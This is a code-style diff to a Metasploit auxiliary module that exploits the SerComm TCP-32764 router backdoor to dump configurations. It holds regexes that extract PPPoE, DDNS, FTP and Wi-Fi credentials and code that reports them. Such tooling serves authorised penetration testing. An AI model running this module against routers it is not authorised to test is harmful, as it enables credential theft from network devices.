@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,7 +8,6 @@ require 'msf/core'
 require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
 
@@ -18,10 +18,10 @@ class MetasploitModule < Msf::Auxiliary
       [ 'PPPoE', { 'user' => /pppoe_username=(\S+)/i, 'pass' => /pppoe_password=(\S+)/i } ],
       [ 'PPPoA', { 'user' => /pppoa_username=(\S+)/i, 'pass' => /pppoa_password=(\S+)/i } ],
       [ 'DDNS', { 'user' => /ddns_user_name=(\S+)/i, 'pass' => /ddns_password=(\S+)/i } ],
-      [ 'CMS', {'user' => /cms_username=(\S+)/i, 'pass' => /cms_password=(\S+)/i } ], # Found in some cameras
-      [ 'BigPondAuth', {'user' => /bpa_username=(\S+)/i, 'pass' => /bpa_password=(\S+)/i } ], # Telstra
+      [ 'CMS', { 'user' => /cms_username=(\S+)/i, 'pass' => /cms_password=(\S+)/i } ], # Found in some cameras
+      [ 'BigPondAuth', { 'user' => /bpa_username=(\S+)/i, 'pass' => /bpa_password=(\S+)/i } ], # Telstra
       [ 'L2TP', { 'user' => /l2tp_username=(\S+)/i, 'pass' => /l2tp_password=(\S+)/i } ],
-      [ 'FTP', { 'user' => /ftp_login=(\S+)/i, 'pass' => /ftp_password=(\S+)/i } ],
+      [ 'FTP', { 'user' => /ftp_login=(\S+)/i, 'pass' => /ftp_password=(\S+)/i } ]
     ],
     'General' => [
       ['Wifi SSID', /wifi_ssid=(\S+)/i],
@@ -31,36 +31,37 @@ class MetasploitModule < Msf::Auxiliary
       ['Wifi Key 4', /wifi_key4=(\S+)/i],
       ['Wifi PSK PWD', /wifi_psk_pwd=(\S+)/i]
     ]
-  }
+  }.freeze
 
   attr_accessor :endianess
   attr_accessor :credentials
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'           => "SerComm Device Configuration Dump",
-      'Description'    => %q{
-        This module will dump the configuration of several SerComm devices. These devices
-        typically include routers from NetGear and Linksys. This module was tested
-        successfully against the NetGear DG834 series ADSL modem router.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Eloi Vanderbeken <eloi.vanderbeken[at]gmail.com>', # Initial discovery, poc
-          'Matt "hostess" Andreko <mandreko[at]accuvant.com>' # Msf module
-        ],
-      'References'     =>
-        [
-          [ 'OSVDB', '101653' ],
-          [ 'URL', 'https://github.com/elvanderb/TCP-32764' ]
-        ],
-      'DisclosureDate' => "Dec 31 2013" ))
+                      'Name'           => "SerComm Device Configuration Dump",
+                      'Description'    => %q(
+                        This module will dump the configuration of several SerComm devices. These devices
+                        typically include routers from NetGear and Linksys. This module was tested
+                        successfully against the NetGear DG834 series ADSL modem router.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [
+                          'Eloi Vanderbeken <eloi.vanderbeken[at]gmail.com>', # Initial discovery, poc
+                          'Matt "hostess" Andreko <mandreko[at]accuvant.com>' # Msf module
+                        ],
+                      'References'     =>
+                        [
+                          [ 'OSVDB', '101653' ],
+                          [ 'URL', 'https://github.com/elvanderb/TCP-32764' ]
+                        ],
+                      'DisclosureDate' => "Dec 31 2013"))
 
-      register_options(
-        [
-          Opt::RPORT(32764),
-        ], self.class)
+    register_options(
+      [
+        Opt::RPORT(32764)
+      ], self.class
+    )
   end
 
   def run
@@ -117,11 +118,11 @@ class MetasploitModule < Msf::Auxiliary
   private
 
   def little_endian?
-    return endianess == 'LE'
+    endianess == 'LE'
   end
 
   def big_endian?
-    return endianess == 'BE'
+    endianess == 'BE'
   end
 
   def string_endianess
@@ -131,9 +132,8 @@ class MetasploitModule < Msf::Auxiliary
       return "Big Endian"
     end
 
-    return nil
+    nil
   end
-
 
   def fingerprint_endian
     begin
@@ -146,9 +146,7 @@ class MetasploitModule < Msf::Auxiliary
       return nil
     end
 
-    unless res
-      return nil
-    end
+    return nil unless res
 
     if res.start_with?("MMcS")
       return 'BE'
@@ -156,7 +154,7 @@ class MetasploitModule < Msf::Auxiliary
       return 'LE'
     end
 
-    return nil
+    nil
   end
 
   def dump_configuration
@@ -200,7 +198,7 @@ class MetasploitModule < Msf::Auxiliary
       # return nil
     end
 
-    return { :length => length, :data => data }
+    { length: length, data: data }
   end
 
   def parse_configuration(data)
@@ -209,9 +207,7 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['VERBOSE']
       vprint_status('All configuration values:')
       configs.sort.each do |i|
-        if i.strip.match(/.*=\S+/)
-          vprint_status(i)
-        end
+        vprint_status(i) if i.strip =~ /.*=\S+/
       end
     end
 
@@ -220,8 +216,8 @@ class MetasploitModule < Msf::Auxiliary
       parse_auth_config(config)
     end
 
-    @credentials.each do |k,v|
-      next unless v[:user] and v[:password]
+    @credentials.each do |k, v|
+      next unless v[:user] && v[:password]
       print_status("#{k}: User: #{v[:user]} Pass: #{v[:password]}")
       report_cred(
         ip: rhost,
@@ -232,13 +228,12 @@ class MetasploitModule < Msf::Auxiliary
         proof: v.inspect
       )
     end
-
   end
 
   def parse_general_config(config)
     SETTINGS['General'].each do |regex|
       if config.match(regex[1])
-        value = $1
+        value = Regexp.last_match(1)
         print_status("#{regex[0]}: #{value}")
       end
     end
@@ -249,15 +244,9 @@ class MetasploitModule < Msf::Auxiliary
       @credentials[cred[0]] = {} unless @credentials[cred[0]]
 
       # find the user/pass
-      if config.match(cred[1]['user'])
-        @credentials[cred[0]][:user] = $1
-      end
+      @credentials[cred[0]][:user] = Regexp.last_match(1) if config.match(cred[1]['user'])
 
-      if config.match(cred[1]['pass'])
-        @credentials[cred[0]][:password] = $1
-      end
-
+      @credentials[cred[0]][:password] = Regexp.last_match(1) if config.match(cred[1]['pass'])
     end
   end
-
 end
